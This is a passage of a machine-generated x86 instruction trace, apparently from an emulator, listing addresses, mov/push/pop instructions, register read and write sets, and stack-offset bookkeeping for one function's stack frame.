regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x7c and offset 0x7fcc for stack size 0x10000 saving data to stack: 0 4 0x4249e9: push 0, regs_read: [30], regs_write: [30] 0x4249eb: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x4249ee: push edx, regs_read: [30, 24], regs_write: [30] 0x4249ef: push eax, regs_read: [30, 19], regs_write: [30] 0x4249f5: mov esi, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x8c and offset 0x7fdc for stack size 0x10000 0x4249fa: mov ebx, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x8c and offset 0x7fe8 for stack size 0x10000 0x4249ff: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8c and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x424a02: mov edi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x8c and offset 0x800c for stack size 0x10000 0x424a0b: push 0, regs_read: [30], regs_write: [30] 0x424a0d: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x424a10: mov dword ptr [ebp - 0x38], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x94 and offset 0x7fc8 for stack size 0x10000 saving data to stack: 0 4 0x424a16: mov eax, dword ptr [edi + 0x10], regs_read: [23], regs_write: [19] 0x424a1e: push edx, regs_read: [30, 24], regs_write: [30] 0x424a1f: push eax, regs_read: [30, 19], regs_write: [30] 0x424a20: mov dword ptr [ebp - 0x3c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x9c and offset 0x7fc4 for stack size 0x10000 saving data to stack: 0 4 0x424a2d: mov ebx, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x9c and offset 0x7fe4 for stack size 0x10000 0x424a30: push 0, regs_read: [30], regs_write: [30] 0x424a32: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x424a37: mov dword ptr [ebp - 0xc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xa4 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x424a3a: mov esi, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xa4 and offset 0x7fe0 for stack size 0x10000 0x424a43: mov eax, dword ptr [edi + 0x18], regs_read: [23], regs_write: [19] 0x424a46: mov dword ptr [ebp - 0x40], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xa4 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 4 0x424a51: push edx, regs_read: [30, 24], regs_write: [30] 0x424a52: push eax, regs_read: [30, 19], regs_write: [30] 0x424a53: mov dword ptr [ebp - 0x44], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xac and offset 0x7fbc for stack size 0x10000 saving data to stack: 0 4 0x424a5e: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xac and offset 0x7ff0 for stack size 0x10000 0x424a63: mov dword ptr [ebp - 0x20], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xac and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 4 0x424a66: mov edi, edx, regs_read: [24], regs_write: [23] 0x424a68: mov eax, dword ptr [ebp - 0x28], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xac and offset 0x7fd8 for stack size 0x10000 0x424a72: push 0, regs_read: [30], regs_write: [30] 0x424a74: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x424a7e: mov dword ptr [ebp - 0x24], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xb4 and offset 0x7fdc for stack size 0x10000 saving data to stack: 0 4 0x424a81: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xb4 and offset 0x800c for stack size 0x10000 0x424a87: mov dword ptr [ebp - 0x10], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xb4 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x424a8a: mov eax, dword ptr [eax + 0x20], regs_read: [19], regs_write: [19] 0x424a8e: push edx, regs_read: [30, 24], regs_write: [30] 0x424a8f: push eax, regs_read: [30, 19], regs_write: [30] 0x424a95: mov ebx, eax, regs_read: [19], regs_write: [21] 0x424a97: mov esi, edx, regs_read: [24], regs_write: [29] 0x424a9c: mov edx, dword ptr [ebp - 4], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xbc and offset 0x7ffc for stack size 0x10000 0x424a9f: mov ecx, edx, regs_read: [24], regs_write: [22] 0x424aaa: mov eax, dword ptr [ebp - 0x30], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7fd0 for stack size 0x10000 0x424ab4: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424abb: mov dword ptr [ebp - 4], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xbc and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x424abe: mov edx, dword ptr [ebp + 8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xbc and offset 0x8008 for stack size 0x10000 0x424ac1: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7ffc for stack size 0x10000 0x424ac4: mov dword ptr [edx], eax, regs_read: [24, 19], regs_write: () 0x424ac6: mov eax, dword ptr [ebp - 0x34], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7fcc for stack size 0x10000 0x424ace: mov eax, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7fc8 for stack size 0x10000 0x424ad4: mov dword ptr [edx + 4], ecx, regs_read: [24, 22], regs_write: () 0x424ad7: mov ecx, dword ptr [ebp - 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xbc and offset 0x7ff8 for stack size 0x10000 0x424ae7: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424aef: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7ff8 for stack size 0x10000 0x424af2: mov dword ptr [edx + 8], eax, regs_read: [24, 19], regs_write: () 0x424af5: mov eax, dword ptr [ebp - 0x3c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7fc4 for stack size 0x10000 0x424afd: mov eax, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7fc0 for stack size 0x10000 0x424b03: mov dword ptr [edx + 0xc], ecx, regs_read: [24, 22], regs_write: () 0x424b06: mov ecx, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xbc and offset 0x7ff4 for stack size 0x10000 0x424b16: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424b1e: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7ff4 for stack size 0x10000 0x424b21: mov dword ptr [edx + 0x10], eax, regs_read: [24, 19], regs_write: () 0x424b24: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7fbc for stack size 0x10000 0x424b2f: mov dword ptr [edx + 0x14], ecx, regs_read: [24, 22], regs_write: () 0x424b32: mov ecx, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xbc and offset 0x7fe0 for stack size 0x10000 0x424b42: mov edi, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xbc and offset 0x7fe0 for stack size 0x10000 0x424b45: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424b4c: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7fdc for stack size 0x10000 0x424b54: mov dword ptr [edx + 0x18], edi, regs_read: [24, 23], regs_write: () 0x424b5a: mov dword ptr [edx + 0x1c], ecx, regs_read: [24, 22], regs_write: () 0x424b5d: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x424b65: pop edi, regs_read: [30], regs_write: [30, 23] 0x424b6d: pop esi, regs_read: [30], regs_write: [30, 29] 0x424b6e: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424b75: mov eax, dword ptr [ebp - 0x2c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xb4 and offset 0x7fd4 for stack size 0x10000 0x424b7d: mov dword ptr [edx + 0x20], ebx, regs_read: [24, 21], regs_write: () 0x424b83: mov dword ptr [edx + 0x24], ecx, regs_read: [24, 22], regs_write: () 0x424b86: pop ebx, regs_read: [30], regs_write: [30, 21] 0x424b87: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0xb0 and offset 0x8000 for stack size 0x10000 0x424b89: pop ebp, regs_read: [30], regs_write: [30, 20] 0x424b90: push ebp, regs_read: [30, 20], regs_write: [30] 0x424b91: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x424b96: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x424b99: push ebx, regs_read: [30, 21], regs_write: [30] 0x424b9a: push esi, regs_read: [30, 29], regs_write: [30] 0x424b9b: push edi, regs_read: [30, 23], regs_write: [30] 0x424b9c: mov edi, dword ptr [eax + 0x10], regs_read: [19], regs_write: [23] 0x424b9f: mov ecx, dword ptr [eax], regs_read: [19], regs_write: [22] 0x424ba1: mov ebx, dword ptr [eax + 4], regs_read: [19], regs_write: [21] 0x424ba4: mov esi, dword ptr [eax + 8], regs_read: [19], regs_write: [29] 0x424ba7: mov edx, dword ptr [eax + 0xc], regs_read: [19], regs_write: [24] 0x424baa: mov dword ptr [ebp - 0x2c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd4 for stack size 0x10000 saving data to stack: 0 4 0x424bad: mov edi, dword ptr [eax + 0x14], regs_read: [19], regs_write: [23] 0x424bb0: mov dword ptr [ebp - 0x14], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 saving data to stack: 0 4 0x424bb3: mov edi, dword ptr [eax + 0x18], regs_read: [19], regs_write: [23] 0x424bb6: mov dword ptr [ebp - 0x28], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd8 for stack size 0x10000 saving data to stack: 0 4 0x424bb9: mov edi, dword ptr [eax + 0x1c], regs_read: [19], regs_write: [23] 0x424bbc: mov dword ptr [ebp - 0x3c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 saving data to stack: 0 4 0x424bbf: mov edi, dword ptr [eax + 0x20], regs_read: [19], regs_write: [23] 0x424bc2: mov eax, dword ptr [eax + 0x24], regs_read: [19], regs_write: [19] 0x424bc5: mov dword ptr [ebp - 0x54], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x424bcb: mov dword ptr [ebp - 0x24], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 saving data to stack: 0 4 0x424bd1: mov dword ptr [ebp - 0x38], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 saving data to stack: 0 4 0x424bd7: mov dword ptr [ebp - 0x40], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 4 0x424bdd: mov dword ptr [ebp - 0x30], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 4 0x424be0: mov dword ptr [ebp - 0x48], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x424be3: mov edi, dword ptr [ebp - 0x2c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fd4 for stack size 0x10000 0x424be6: mov dword ptr [ebp - 0x50], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x424be9: mov dword ptr [ebp - 0x4c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x424bf3: mov dword ptr [ebp - 0x70], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x424bf6: mov dword ptr [ebp - 0x58], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x424c01: mov dword ptr [ebp - 0x44], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 saving data to stack: 0 4 0x424c08: mov dword ptr [ebp - 0x5c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 saving data to stack: 0 4 0x424c0b: mov dword ptr [ebp - 0x20], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 4 0x424c15: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x424c18: mov eax, esi, regs_read: [29], regs_write: [19] 0x424c1a: mov dword ptr [ebp - 0xc], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x424c23: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x424c2f: mov eax, edi, regs_read: [23], regs_write: [19] 0x424c3a: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x424c48: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424c52: mov eax, dword ptr [ebp - 0x28], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fd8 for stack size 0x10000 0x424c5b: mov eax, edi, regs_read: [23], regs_write: [19] 0x424c5f: mov ecx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x424c62: mov dword ptr [ebp + 0xc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 saving data to stack: 0 4 0x424c65: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x424c68: mov dword ptr [ebp - 0x1c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 saving data to stack: 0 4 0x424c76: mov eax, dword ptr [ebp - 0x30], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x424c81: mov ecx, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 0x424c86: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x424c8f: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424c9a: mov eax, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x424ca1: mov dword ptr [ebp - 0x1c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 saving data to stack: 0 4 0x424ca7: mov ecx, dword ptr [ebp - 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 0x424cb3: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x424cb9: mov edx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x424cc3: mov dword ptr [ebp - 0x64], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x424cc6: mov eax, esi, regs_read: [29], regs_write: [19] 0x424cc8: mov dword ptr [ebp - 0x68], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x424cd0: mov dword ptr [ebp - 0x18], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe8 for stack size 0x10000 saving data to stack: 0 4 0x424cd3: mov ecx, edx, regs_read: [24], regs_write: [22] 0x424cd5: mov eax, edi, regs_read: [23], regs_write: [19] 0x424cdd: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x424ce8: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x424cf3: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424cfa: mov ebx, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x7fe8 for stack size 0x10000 0x424cff: mov eax, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 0x424d07: mov dword ptr [ebp - 0x18], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe8 for stack size 0x10000 saving data to stack: 0 4 0x424d0d: mov ebx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x424d20: mov dword ptr [ebp - 0x60], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x424d23: mov eax, edi, regs_read: [23], regs_write: [19] 0x424d25: mov edi, dword ptr [ebp - 0x3c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 0x424d28: mov dword ptr [ebp - 0x74], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 saving data to stack: 0 4 0x424d30: mov dword ptr [ebp - 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x424d33: mov edi, edx, regs_read: [24], regs_write: [23] 0x424d35: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x424d3e: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424d49: mov eax, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 0x424d54: mov eax, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x424d67: mov eax, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe8 for stack size 0x10000 0x424d6f: mov ebx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x424d7c: mov dword ptr [ebp - 0x6c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x424d7f: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x424d87: mov dword ptr [ebp - 0x34], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 saving data to stack: 0 4 0x424d8a: mov ebx, edx, regs_read: [24], regs_write: [21] 0x424d8c: mov eax, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x424d95: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x424da0: mov eax, esi, regs_read: [29], regs_write: [19] 0x424da2: mov esi, dword ptr [ebp - 0x34], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 0x424dac: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424db6: mov eax, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 0x424dc0: mov eax, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x424dc8: mov edx, dword ptr [ebp - 0x3c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 0x424dcd: mov dword ptr [ebp - 0x34], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 saving data to stack: 0 4 0x424ddf: mov dword ptr [ebp - 0x70], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x424de2: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x424de7: mov ecx, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x424dea: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x424ded: mov esi, edx, regs_read: [24], regs_write: [29] 0x424def: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424dfc: mov edx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x424e08: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424e13: mov eax, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x424e1e: mov eax, dword ptr [ebp - 0x30], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x424e29: mov eax, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x424e31: mov eax, dword ptr [ebp - 0x34], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 0x424e42: mov dword ptr [ebp - 0x5c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 saving data to stack: 0 4 0x424e45: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424e4a: mov edx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x424e52: mov edi, eax, regs_read: [19], regs_write: [23] 0x424e54: mov ecx, edx, regs_read: [24], regs_write: [22] 0x424e56: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x424e5e: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x424e68: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424e72: mov eax, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 0x424e7c: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 0x424e84: mov dword ptr [ebp - 0x50], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x424e95: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x424e98: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x424ea1: mov ebx, eax, regs_read: [19], regs_write: [21] 0x424ea3: mov edi, edx, regs_read: [24], regs_write: [23] 0x424ea5: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424ead: mov eax, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 0x424eb7: mov eax, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x424ec1: mov eax, dword ptr [ebp - 0x30], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x424ecb: mov eax, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 0x424ed3: mov edx, dword ptr [ebp - 0x74], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 0x424ed8: mov dword ptr [ebp - 0x44], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 saving data to stack: 0 4 0x424edb: mov ebx, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x424ef4: mov dword ptr [ebp - 0x78], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 saving data to stack: 0 4 0x424efe: mov ebx, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x424f0a: mov ecx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x424f1d: mov dword ptr [ebp - 0x74], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 saving data to stack: 0 4 0x424f20: mov ecx, eax, regs_read: [19], regs_write: [22] 0x424f22: mov esi, edx, regs_read: [24], regs_write: [29] 0x424f24: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x424f2e: mov edx, dword ptr [ebp - 0x3c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 0x424f31: push 0, regs_read: [30], regs_write: [30] 0x424f33: push 0x13, regs_read: [30], regs_write: [30] 0x424f3d: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7fdc for stack size 0x10000 0x424f47: mov eax, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7fc0 for stack size 0x10000 0x424f51: mov eax, dword ptr [ebp - 0x2c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7fd4 for stack size 0x10000 0x424f5a: mov eax, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7fdc for stack size 0x10000 0x424f61: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x424f63: mov dword ptr [ebp - 0x60], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x14 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x424f78: mov edi, eax, regs_read: [19], regs_write: [23] 0x424f7a: mov ecx, edx, regs_read: [24], regs_write: [22] 0x424f7c: mov eax, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7fc8 for stack size 0x10000 0x424f87: mov eax, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7fc0 for stack size 0x10000 0x424f91: mov eax, dword ptr [ebp - 0x30], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7fd0 for stack size 0x10000 0x424f9b: mov eax, dword ptr [ebp - 0x58], regs_read: [20], 